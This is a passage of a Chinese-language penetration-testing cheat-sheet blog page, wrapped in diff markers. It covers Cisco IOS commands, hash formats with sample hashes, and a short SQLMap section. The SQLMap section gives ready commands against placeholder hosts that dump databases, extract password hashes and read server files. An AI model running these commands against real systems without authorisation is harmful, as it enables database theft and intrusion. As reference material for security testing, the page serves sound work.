+<td><code>x67</code></td>
+<td>g</td>
+</tr>
+<tr>
+<td><code>x68</code></td>
+<td>h</td>
+</tr>
+<tr>
+<td><code>x69</code></td>
+<td>i</td>
+</tr>
+<tr>
+<td><code>x6a</code></td>
+<td>j</td>
+</tr>
+<tr>
+<td><code>x6b</code></td>
+<td>k</td>
+</tr>
+<tr>
+<td><code>x6c</code></td>
+<td>l</td>
+</tr>
+<tr>
+<td><code>x6d</code></td>
+<td>m</td>
+</tr>
+<tr>
+<td><code>x6e</code></td>
+<td>n</td>
+</tr>
+<tr>
+<td><code>x6f</code></td>
+<td>o</td>
+</tr>
+<tr>
+<td><code>x70</code></td>
+<td>p</td>
+</tr>
+<tr>
+<td><code>x71</code></td>
+<td>q</td>
+</tr>
+<tr>
+<td><code>x72</code></td>
+<td>r</td>
+</tr>
+<tr>
+<td><code>x73</code></td>
+<td>s</td>
+</tr>
+<tr>
+<td><code>x74</code></td>
+<td>t</td>
+</tr>
+<tr>
+<td><code>x75</code></td>
+<td>u</td>
+</tr>
+<tr>
+<td><code>x76</code></td>
+<td>v</td>
+</tr>
+<tr>
+<td><code>x77</code></td>
+<td>w</td>
+</tr>
+<tr>
+<td><code>x78</code></td>
+<td>x</td>
+</tr>
+<tr>
+<td><code>x79</code></td>
+<td>y</td>
+</tr>
+<tr>
+<td><code>x7a</code></td>
+<td>z</td>
+</tr>
+</tbody></table>
+<h2 id="CISCO-IOS-网际操作系统-命令"><a href="#CISCO-IOS-网际操作系统-命令" class="headerlink" title="CISCO IOS(网际操作系统) 命令"></a>CISCO IOS(网际操作系统) 命令</h2><p>收集一些有用的Cisco IOS 命令.</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>enable</code></td>
+<td>进入使能模式</td>
+</tr>
+<tr>
+<td><code>conf t</code></td>
+<td>配置终端</td>
+</tr>
+<tr>
+<td><code>(config)# interface fa0/0</code></td>
+<td>配置 FastEthernet 0/0</td>
+</tr>
+<tr>
+<td><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></td>
+<td>添加IP到 fa0/0</td>
+</tr>
+<tr>
+<td><code>(config-if)# line vty 0 4</code></td>
+<td>配置 vty line</td>
+</tr>
+<tr>
+<td><code>(config-line)# login</code></td>
+<td>登陆</td>
+</tr>
+<tr>
+<td><code>(config-line)# password YOUR-PASSWORD</code></td>
+<td>设置 telnet 密码</td>
+</tr>
+<tr>
+<td><code># show running-config</code></td>
+<td>显示内存中的运行配置</td>
+</tr>
+<tr>
+<td><code># show startup-config</code></td>
+<td>显示启动配置</td>
+</tr>
+<tr>
+<td><code># show version</code></td>
+<td>显示cisco IOS 版本</td>
+</tr>
+<tr>
+<td><code># show session</code></td>
+<td>显示已打开的会话</td>
+</tr>
+<tr>
+<td><code># show ip interface</code></td>
+<td>显示网卡</td>
+</tr>
+<tr>
+<td><code># show interface e0</code></td>
+<td>显示网络接口细节</td>
+</tr>
+<tr>
+<td><code># show ip route</code></td>
+<td>显示路由</td>
+</tr>
+<tr>
+<td><code># show access-lists</code></td>
+<td>显示access lists</td>
+</tr>
+<tr>
+<td><code># dir file systems</code></td>
+<td>列出可用文件</td>
+</tr>
+<tr>
+<td><code># dir all-filesystems</code></td>
+<td>显示文件信息</td>
+</tr>
+<tr>
+<td><code># dir /all</code></td>
+<td>显示已删除文件</td>
+</tr>
+<tr>
+<td><code># terminal length 0</code></td>
+<td>取消终端输出长度限制</td>
+</tr>
+<tr>
+<td><code># copy running-config tftp</code></td>
+<td>复制运行配置到tftp 服务器</td>
+</tr>
+<tr>
+<td><code># copy running-config startup-config</code></td>
+<td>复制启动配置到运行配置</td>
+</tr>
+</tbody></table>
+<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="哈希长度"><a href="#哈希长度" class="headerlink" title="哈希长度"></a>哈希长度</h3><table>
+<thead>
+<tr>
+<th>哈希</th>
+<th>长度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MD5</td>
+<td><code>16 Bytes</code></td>
+</tr>
+<tr>
+<td>SHA-1</td>
+<td><code>20 Bytes</code></td>
+</tr>
+<tr>
+<td>SHA-256</td>
+<td><code>32 Bytes</code></td>
+</tr>
+<tr>
+<td>SHA-512</td>
+<td><code>64 Bytes</code></td>
+</tr>
+</tbody></table>
+<h3 id="哈希例子"><a href="#哈希例子" class="headerlink" title="哈希例子"></a>哈希例子</h3><p>可以直接使用  <strong>hash-identifier</strong>  命令判断哈希类型，但这里还是举些例子。</p>
+<table>
+<thead>
+<tr>
+<th>哈希</th>
+<th>例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MD5 Hash Example</td>
+<td><code>8743b52063cd84097a65d1633f5c74f5</code></td>
+</tr>
+<tr>
+<td>MD5 $PASS:$SALT Example</td>
+<td><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></td>
+</tr>
+<tr>
+<td>MD5 $SALT:$PASS</td>
+<td><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></td>
+</tr>
+<tr>
+<td>SHA1 Hash Example</td>
+<td><code>b89eaac7e61417341b710b727768294d0e6a277b</code></td>
+</tr>
+<tr>
+<td>SHA1 $PASS:$SALT</td>
+<td><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></td>
+</tr>
+<tr>
+<td>SHA1 $SALT:$PASS</td>
+<td><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></td>
+</tr>
+<tr>
+<td>SHA-256</td>
+<td><code>127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935</code></td>
+</tr>
+<tr>
+<td>SHA-256 $PASS:$SALT</td>
+<td><code>c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4</code></td>
+</tr>
+<tr>
+<td>SHA-256 $SALT:$PASS</td>
+<td><code>eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617</code></td>
+</tr>
+<tr>
+<td>SHA-512</td>
+<td><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f</code></td>
+</tr>
+<tr>
+<td>SHA-512 $PASS:$SALT</td>
+<td><code>e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd</code></td>
+</tr>
+<tr>
+<td>SHA-512 $SALT:$PASS</td>
+<td><code>976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a</code></td>
+</tr>
+<tr>
+<td>NTLM Hash Example</td>
+<td><code>b4b9b02e6f09a9bd760f388b67351e2b</code></td>
+</tr>
+</tbody></table>
+<h2 id="SQLMap例子"><a href="#SQLMap例子" class="headerlink" title="SQLMap例子"></a>SQLMap例子</h2><p>小型 SQLMap 速查表：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3</code></td>
+<td>自动化sqlmap扫描</td>
+</tr>
+<tr>
+<td><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords  --file-read=&quot;/var/www/blah.php&quot;</code></td>
+<td>指定目标的sqlmap scan</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; --dbms=mysql --tech=U --random-agent --dump </code></td>
+<td>使用联合查询技术扫描mysql后端的基于报错的注入 ，使用随机UA，导出数据库</td>
+</tr>
+<tr>
+<td><code>sqlmap -o -u &quot;http://meh.com/form/&quot; --forms</code></td>
+<td>检测可能存在注入点表单</td>
+</tr>
+<tr>
+<td><code>sqlmap -o -u &quot;http://meh/vuln-form&quot; --forms  -D database-name -T users --dump</code></td>
+<td>导出指定数据库的user表并尝试破解哈希。</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/180721MeepwnMaplStory/" rel="prev" title="Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含">
+      <i class="fa fa-chevron-left"></i> Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/180811-xxe-injection/" rel="next" title="XML外部实体注入小结">
+      XML外部实体注入小结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%A4%87%E5%BF%98%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">渗透测试工具备忘录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">更新日志：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E5%89%8D"><span class="nav-number">1.2.</span> <span class="nav-text">开始前</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-number">1.2.1.</span> <span class="nav-text">网络配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AEIP-%E5%9C%B0%E5%9D%80"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">设置IP 地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">子网划分</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AC%E5%BC%80%E6%9D%A5%E6%BA%90%E6%83%85%E6%8A%A5"><span class="nav-number">1.3.</span> <span class="nav-text">公开来源情报</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.3.1.</span> <span class="nav-text">被动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">DNS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WHOIS-%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.3.1.1.1.</span> <span class="nav-text">WHOIS 枚举</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2DNS-IP"><span class="nav-number">1.3.1.1.2.</span> <span class="nav-text">查询DNS IP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2MX%E8%AE%B0%E5%BD%95"><span class="nav-number">1.3.1.1.3.</span> <span class="nav-text">查询MX记录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%A8DIG-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E4%BC%A0%E9%80%81"><span class="nav-number">1.3.1.1.4.</span> <span class="nav-text">用DIG 查询域传送</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS-%E5%9F%9F%E4%BC%A0%E9%80%81"><span class="nav-number">1.4.</span> <span class="nav-text">DNS 域传送</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%82%AE%E4%BB%B6"><span class="nav-number">1.4.1.</span> <span class="nav-text">邮件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Simply-Email"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">Simply Email</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%8A%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.4.2.</span> <span class="nav-text">半主动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">基本指纹识别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8NC%E6%8A%93%E5%8F%96banner"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">使用NC抓取banner</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.4.3.</span> <span class="nav-text">主动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-%E7%88%86%E7%A0%B4"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">DNS 爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DNSRecon"><span class="nav-number">1.4.3.1.1.</span> <span class="nav-text">DNSRecon</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Nmap%E5%91%BD%E4%BB%A4"><span class="nav-number">1.4.3.2.1.</span> <span class="nav-text">Nmap命令</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Nmap-UDP%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.3.2.1.1.</span> <span class="nav-text">Nmap UDP扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#UDP-%E5%8D%8F%E8%AE%AE%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="nav-number">1.4.3.2.1.2.</span> <span class="nav-text">UDP 协议扫描器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">1.4.3.2.1.3.</span> <span class="nav-text">其他主机发现</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E5%92%8C%E6%94%BB%E5%87%BB%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.5.</span> <span class="nav-text">枚举和攻击网络服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SAMB-SMB-Windows-%E5%9F%9F%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.5.1.</span> <span class="nav-text">SAMB &#x2F; SMB &#x2F; Windows 域枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Samba%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">Samba枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SMB%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7"><span class="nav-number">1.5.1.1.1.</span> <span class="nav-text">SMB枚举工具</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SMB-%E7%89%88%E6%9C%AC%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">1.5.1.1.2.</span> <span class="nav-text">SMB 版本指纹识别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E5%BC%80%E6%94%BE%E7%9A%84SMB%E5%85%B1%E4%BA%AB"><span class="nav-number">1.5.1.1.3.</span> <span class="nav-text">寻找开放的SMB共享</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BESMB%E7%94%A8%E6%88%B7"><span class="nav-number">1.5.1.1.4.</span> <span class="nav-text">枚举SMB用户</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95%E7%A9%BA%E4%BC%9A%E8%AF%9D"><span class="nav-number">1.5.1.1.4.1.</span> <span class="nav-text">手动测试空会话</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#NBTScan-unixwiz"><span class="nav-number">1.5.1.1.4.2.</span> <span class="nav-text">NBTScan unixwiz</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LLMNR-NBT-NS%E6%AC%BA%E9%AA%97"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">LLMNR &#x2F; NBT-NS欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Metasploit%E8%BF%9B%E8%A1%8C-LLMNR-NetBIOS%E8%AF%B7%E6%B1%82"><span class="nav-number">1.5.1.2.1.</span> <span class="nav-text">使用Metasploit进行 LLMNR &#x2F; NetBIOS请求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Responder-py"><span class="nav-number">1.5.1.2.2.</span> <span class="nav-text">Responder.py</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SNMP%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">SNMP枚举工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SNMPv3%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7"><span class="nav-number">1.5.1.3.1.</span> <span class="nav-text">SNMPv3枚举工具</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">远程服务枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#RSH-%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.5.1.4.1.</span> <span class="nav-text">RSH 枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#RSH%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.5.1.4.1.1.</span> <span class="nav-text">RSH运行命令</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MetasploitRSH-%E7%99%BB%E9%99%86%E6%89%AB%E6%8F%8F"><span class="nav-number">1.5.1.4.1.2.</span> <span class="nav-text">MetasploitRSH 登陆扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8rusers%E6%98%BE%E7%A4%BA%E5%B7%B2%E7%99%BB%E9%99%86%E7%94%A8%E6%88%B7"><span class="nav-number">1.5.1.4.1.3.</span> <span class="nav-text">使用rusers显示已登陆用户</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8rlogin%E6%89%AB%E6%8F%8F%E6%95%B4%E4%B8%AA%E5%AD%90%E7%BD%91"><span class="nav-number">1.5.1.4.1.4.</span> <span class="nav-text">使用rlogin扫描整个子网</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8finger%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">使用finger枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Solaris%E7%9A%84bug%E6%98%BE%E7%A4%BA%E6%89%80%E6%9C%89%E5%B7%B2%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7"><span class="nav-number">1.5.1.5.1.</span> <span class="nav-text">利用Solaris的bug显示所有已登录用户</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rwho"><span class="nav-number">1.5.1.6.</span> <span class="nav-text">rwho</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TLS-amp-SSL-%E6%B5%8B%E8%AF%95"><span class="nav-number">1.6.</span> <span class="nav-text">TLS&amp;SSL 测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#testssl-sh"><span class="nav-number">1.6.1.</span> <span class="nav-text">testssl.sh</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0"><span class="nav-number">1.7.</span> <span class="nav-text">漏洞评估</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">1.8.</span> <span class="nav-text">数据库渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle"><span class="nav-number">1.8.1.</span> <span class="nav-text">Oracle</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-TNS%E7%89%88%E6%9C%AC%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">1.8.1.1.</span> <span class="nav-text">Oracle TNS版本指纹识别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E7%A0%B4Oracle%E8%B4%A6%E6%88%B7"><span class="nav-number">1.8.1.2.</span> <span class="nav-text">爆破Oracle账户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.8.1.3.</span> <span class="nav-text">Oracle权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8NMAP-NSE%E8%84%9A%E6%9C%AC%E9%AA%8C%E8%AF%81oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E9%BB%98%E8%AE%A4%E8%B4%A6%E6%88%B7%EF%BC%9A"><span class="nav-number">1.8.1.3.1.</span> <span class="nav-text">使用NMAP NSE脚本验证oracle数据库中的默认账户：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A1%AE%E8%AE%A4%E4%B8%80%E4%B8%AAoracle%E7%94%A8%E6%88%B7%E7%9A%84%E6%9D%83%E9%99%90%E7%BA%A7%E5%88%AB"><span class="nav-number">1.8.1.3.2.</span> <span class="nav-text">确认一个oracle用户的权限级别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Oracle%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%92%8C%E8%AE%BF%E9%97%AEDBA"><span class="nav-number">1.8.1.3.3.</span> <span class="nav-text">Oracle权限提升和访问DBA</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.8.1.3.4.</span> <span class="nav-text">运行查询语句</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A7%BB%E9%99%A4%E5%88%A9%E7%94%A8%E7%97%95%E8%BF%B9%EF%BC%9A"><span class="nav-number">1.8.1.3.5.</span> <span class="nav-text">移除利用痕迹：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96Oracle%E5%8F%8D%E5%BC%B9shell%EF%BC%9A"><span class="nav-number">1.8.1.3.6.</span> <span class="nav-text">获取Oracle反弹shell：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL"><span class="nav-number">1.8.2.</span> <span class="nav-text">MSSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E7%A0%B4-MSSQL%E7%99%BB%E9%99%86"><span class="nav-number">1.8.2.1.</span> <span class="nav-text">爆破 MSSQL登陆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Metasploit-MSSQL-Shell"><span class="nav-number">1.8.2.2.</span> <span class="nav-text">Metasploit MSSQL Shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C"><span class="nav-number">1.9.</span> <span class="nav-text">网络</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Plink-exe-%E9%9A%A7%E9%81%93"><span class="nav-number">1.9.1.</span> <span class="nav-text">Plink.exe 隧道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%B3%E6%9D%BF%EF%BC%88Pivoting%EF%BC%89"><span class="nav-number">1.9.2.</span> <span class="nav-text">跳板（Pivoting）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH-%E8%B7%B3%E6%9D%BF%EF%BC%88ssh-Pivoting%EF%BC%89"><span class="nav-number">1.9.2.1.</span> <span class="nav-text">SSH 跳板（ssh Pivoting）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Meterpreter-Pivoting"><span class="nav-number">1.9.2.2.</span> <span class="nav-text">Meterpreter Pivoting</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TTL-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">1.9.3.</span> <span class="nav-text">TTL 指纹识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IPv4-%E9%80%9F%E6%9F%A5"><span class="nav-number">1.9.4.</span> <span class="nav-text">IPv4 速查</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%84%E7%B1%BBIP%E7%9A%84%E5%9C%B0%E5%9D%80%E8%8C%83%E5%9B%B4"><span class="nav-number">1.9.4.1.</span> <span class="nav-text">各类IP的地址范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IPv4%E7%A7%81%E6%9C%89%E5%9C%B0%E5%9D%80"><span class="nav-number">1.9.4.2.</span> <span class="nav-text">IPv4私有地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IPv4%E5%AD%90%E7%BD%91%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-number">1.9.4.3.</span> <span class="nav-text">IPv4子网速查表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VLAN-hopping%EF%BC%88%E8%B7%B3%E8%B7%83%E6%94%BB%E5%87%BB%EF%BC%89"><span class="nav-number">1.9.5.</span> <span class="nav-text">VLAN hopping（跳跃攻击）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VPN%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="nav-number">1.9.6.</span> <span class="nav-text">VPN测试工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IKEForce"><span class="nav-number">1.9.6.1.</span> <span class="nav-text">IKEForce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IKE-%E6%BF%80%E8%BF%9B%E6%A8%A1%E5%BC%8F-PSK-%E7%A0%B4%E8%A7%A3"><span class="nav-number">1.9.6.2.</span> <span class="nav-text">IKE 激进模式 PSK 破解</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-1-%E9%AA%8C%E8%AF%81IKE%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">1.9.6.2.1.</span> <span class="nav-text">Step 1: 验证IKE服务器</span></a></li><li class="nav-item 